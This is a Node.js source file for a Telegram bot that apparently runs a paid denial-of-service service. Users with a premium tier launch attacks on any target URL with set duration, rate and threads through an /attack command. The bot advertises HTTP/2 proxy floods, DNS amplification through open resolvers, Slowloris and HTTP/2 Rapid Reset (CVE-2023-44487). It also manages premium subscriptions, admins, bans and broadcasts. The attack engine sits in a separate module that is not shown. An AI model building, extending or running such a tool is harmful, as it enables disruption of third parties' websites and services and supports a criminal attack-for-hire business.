const fs = require("fs");
const { Telegraf } = require("telegraf");
const { startAttack, stopAttack, stopAll, getStatus } = require("./cf");
const db = require("./database");

if (fs.existsSync(".env")) {
    const env = fs.readFileSync(".env", "utf8");
    env.split("\n").forEach(line => {
        const [key, ...rest] = line.split("=");
        if (key && rest.length) process.env[key.trim()] = rest.join("=").trim();
    });
}

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = Number(process.env.OWNER_ID) || 0;

if (!BOT_TOKEN) {
    console.error("BOT_TOKEN environment variable is required");
    process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

async function ensureUser(ctx) {
    let user = await db.getUser(ctx.from.id);
    if (!user) {
        user = await db.registerUser(ctx.from.id, ctx.from.username, ctx.from.firstName);
    }
    return user;
}

async function isOwnerOrAdmin(telegramId) {
    if (telegramId === OWNER_ID) return true;
    const user = await db.getUser(telegramId);
    return user && user.isAdmin;
}

bot.use(async (ctx, next) => {
    if (!ctx.from) return next();
    try {
        ctx.user = await ensureUser(ctx);
        if (ctx.user.isBanned) {
            return ctx.reply("You are banned from using this bot.").catch(() => {});
        }
        ctx.isOwner = ctx.from.id === OWNER_ID;
    } catch (e) {
        console.error("Auth error:", e.message);
    }
    return next();
});

bot.start(async (ctx) => {
    const prefix = ctx.isOwner ? "👑 *Owner*" : ctx.user.isAdmin ? "⚙️ *Admin*" : ctx.user.isPremium ? "⭐ *Premium*" : "👤 *User*";
    ctx.reply(
        `${prefix}\n\n` +
        `*Commands:*\n` +
        `/attack \\<url\\> \\<time\\> \\<rate\\> \\<threads\\> - Start attack (premium only)\n` +
        `/stop \\[url\\] - Stop attack(s)\n` +
        `/status - Show running attacks\n` +
        `/methods - List attack methods\n` +
        `/myid - Your account info\n` +
        `/register - Register/re-register\n` +
        (ctx.isOwner || ctx.user.isAdmin ? `\n*Admin Commands:*\n` +
            `/addpremium \\<id\\> \\<days\\>\n` +
            `/removepremium \\<id\\>\n` +
            `/announce \\<message\\>\n` +
            `/users - User list\n` +
            `/ban \\<id\\>\n` +
            `/unban \\<id\\>\n` +
            (ctx.isOwner ? `/addadmin \\<id\\>\n/removeadmin \\<id\\>\n` : "") : "") +
        `/help - Show this message`,
        { parse_mode: "Markdown" }
    );
});

bot.command("help", (ctx) => ctx.reply("Send /start for all commands", { parse_mode: "Markdown" }));

bot.command("register", async (ctx) => {
    await db.registerUser(ctx.from.id, ctx.from.username, ctx.from.firstName);
    ctx.reply("✅ Registered successfully");
});

bot.command("myid", async (ctx) => {
    const u = ctx.user;
    const role = ctx.isOwner ? "👑 Owner" : u.isAdmin ? "⚙️ Admin" : u.isPremium ? "⭐ Premium" : "👤 User";
    let msg =
        `*Account Info*\n` +
        `ID: \`${u.telegramId}\`\n` +
        `Name: ${u.firstName || "N/A"}\n` +
        `Username: ${u.username ? "@" + u.username : "N/A"}\n` +
        `Role: ${role}\n` +
        `Attacks Used: ${u.attacksUsed}\n` +
        `Registered: ${u.registeredAt ? u.registeredAt.toDateString() : "N/A"}`;
    if (u.isPremium && u.premiumExpiry) {
        msg += `\nPremium Until: ${u.premiumExpiry.toDateString()}`;
    }
    ctx.reply(msg, { parse_mode: "Markdown" });
});

bot.command("attack", async (ctx) => {
    if (!ctx.user.isPremium && !ctx.isOwner && !ctx.user.isAdmin) {
        return ctx.reply("❌ This command is for premium users only. Contact the admin to get premium.");
    }

    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 4) {
        return ctx.reply("Usage: /attack <url> <time> <rate> <threads>\nExample: /attack https://example.com 60 10 5");
    }

    const [targetUrl, time, rate, threads] = args;
    if (isNaN(time) || isNaN(rate) || isNaN(threads)) {
        return ctx.reply("time, rate, and threads must be numbers");
    }

    const result = startAttack(targetUrl, parseInt(time), parseInt(rate), parseInt(threads));
    if (result.error) return ctx.reply("Error: " + result.error);

    await db.incrementAttacks(ctx.from.id);

    ctx.reply(
        `*Attack Started*\n` +
        `Target: \`${result.target}\`\n` +
        `Duration: ${result.duration}s\n` +
        `Rate: ${result.rate} req/s/thread\n` +
        `Threads: ${result.threads}\n` +
        `Methods: Layer7 + Amplification + Slowloris + HTTP/2 Rapid Reset`,
        { parse_mode: "Markdown" }
    );
});

bot.command("stop", (ctx) => {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length === 0) {
        const result = stopAll();
        return ctx.reply(`Stopped ${result.stopped} attack(s)`);
    }
    const result = stopAttack(args[0]);
    if (result.error) return ctx.reply("Error: " + result.error);
    ctx.reply(`Attack stopped: ${result.target}`);
});

bot.command("status", (ctx) => {
    const attacks = getStatus();
    if (attacks.length === 0) return ctx.reply("No attacks running");
    const lines = attacks.map((a, i) =>
        `${i + 1}. ${a.target}\n   Elapsed: ${a.elapsed}s / ${a.duration}s`
    );
    ctx.reply(`*Running Attacks:*\n\n${lines.join("\n")}`, { parse_mode: "Markdown" });
});

bot.command("methods", (ctx) => {
    ctx.reply(
        `*Available Methods:*\n\n` +
        `1. Layer7 (HTTP/2) - TLS proxy flood via HTTP/2 multiplexing\n` +
        `2. DNS Amplification - UDP amplification via open DNS resolvers\n` +
        `3. Slowloris - Slow HTTP keep-alive connections\n` +
        `4. HTTP/2 Rapid Reset (CVE-2023-44487) - Stream reset flood\n\n` +
        `All methods run simultaneously on /attack`,
        { parse_mode: "Markdown" }
    );
});

// Admin commands below

async function requireOwner(ctx, next) {
    if (ctx.isOwner) return next();
    return ctx.reply("❌ Owner only command").catch(() => {});
}

async function requireAdmin(ctx, next) {
    if (ctx.isOwner || ctx.user.isAdmin) return next();
    return ctx.reply("❌ Admin only command").catch(() => {});
}

bot.command("addpremium", requireAdmin, async (ctx) => {
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length < 2) return ctx.reply("Usage: /addpremium <user_id> <days>");
    const [id, days] = args;
    if (isNaN(id) || isNaN(days)) return ctx.reply("Both user_id and days must be numbers");
    await db.setPremium(Number(id), parseInt(days));
    ctx.reply(`✅ Added premium (${days}d) to \`${id}\``, { parse_mode: "Markdown" });
    bot.telegram.sendMessage(Number(id), `⭐ You have been granted premium for ${days} days!`).catch(() => {});
});

bot.command("removepremium", requireAdmin, async (ctx) => {
    const id = ctx.message.text.split(" ")[1];
    if (!id || isNaN(id)) return ctx.reply("Usage: /removepremium <user_id>");
    await db.removePremium(Number(id));
    ctx.reply(`✅ Removed premium from \`${id}\``, { parse_mode: "Markdown" });
});

bot.command("announce", requireAdmin, async (ctx) => {
    const msg = ctx.message.text.split(" ").slice(1).join(" ");
    if (!msg) return ctx.reply("Usage: /announce <message>");
    ctx.reply("📢 Sending announcement to all users...");
    const ids = await db.getAllRegisteredChatIds();
    let sent = 0, failed = 0;
    for (const id of ids) {
        try {
            await bot.telegram.sendMessage(id, `*📢 Announcement*\n\n${msg}`, { parse_mode: "Markdown" });
            sent++;
        } catch {
            failed++;
        }
    }
    ctx.reply(`✅ Announcement sent\nSent: ${sent}\nFailed: ${failed}`);
});

bot.command("users", requireAdmin, async (ctx) => {
    const users = await db.getAllUsers();
    const total = users.length;
    const premium = users.filter(u => u.isPremium).length;
    const banned = users.filter(u => u.isBanned).length;
    const admins = users.filter(u => u.isAdmin).length;
    ctx.reply(
        `*User Statistics*\n\n` +
        `Total: ${total}\n` +
        `Premium: ${premium}\n` +
        `Admins: ${admins}\n` +
        `Banned: ${banned}`,
        { parse_mode: "Markdown" }
    );
});

bot.command("ban", requireAdmin, async (ctx) => {
    const id = ctx.message.text.split(" ")[1];
    if (!id || isNaN(id)) return ctx.reply("Usage: /ban <user_id>");
    if (Number(id) === OWNER_ID) return ctx.reply("Cannot ban the owner");
    await db.banUser(Number(id));
    ctx.reply(`✅ Banned \`${id}\``, { parse_mode: "Markdown" });
});

bot.command("unban", requireAdmin, async (ctx) => {
    const id = ctx.message.text.split(" ")[1];
    if (!id || isNaN(id)) return ctx.reply("Usage: /unban <user_id>");
    await db.unbanUser(Number(id));
    ctx.reply(`✅ Unbanned \`${id}\``, { parse_mode: "Markdown" });
});

bot.command("addadmin", requireOwner, async (ctx) => {
    const id = ctx.message.text.split(" ")[1];
    if (!id || isNaN(id)) return ctx.reply("Usage: /addadmin <user_id>");
    await db.setAdmin(Number(id));
    ctx.reply(`✅ Added admin: \`${id}\``, { parse_mode: "Markdown" });
});

bot.command("removeadmin", requireOwner, async (ctx) => {
    const id = ctx.message.text.split(" ")[1];
    if (!id || isNaN(id)) return ctx.reply("Usage: /removeadmin <user_id>");
    if (Number(id) === OWNER_ID) return ctx.reply("Cannot remove owner as admin");
    await db.removeAdmin(Number(id));
    ctx.reply(`✅ Removed admin: \`${id}\``, { parse_mode: "Markdown" });
});

bot.catch((err) => console.error("Bot error:", err.message));

(async () => {
    try {
        await db.connectDB();
        await db.setAdmin(OWNER_ID);
        console.log("Owner set as admin");
        const expired = await db.checkPremiumValidity();
        if (expired > 0) console.log(`Cleaned ${expired} expired premium users`);
        bot.launch();
        console.log("Bot started");
    } catch (err) {
        console.error("Failed to start:", err);
        process.exit(1);
    }
})();

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));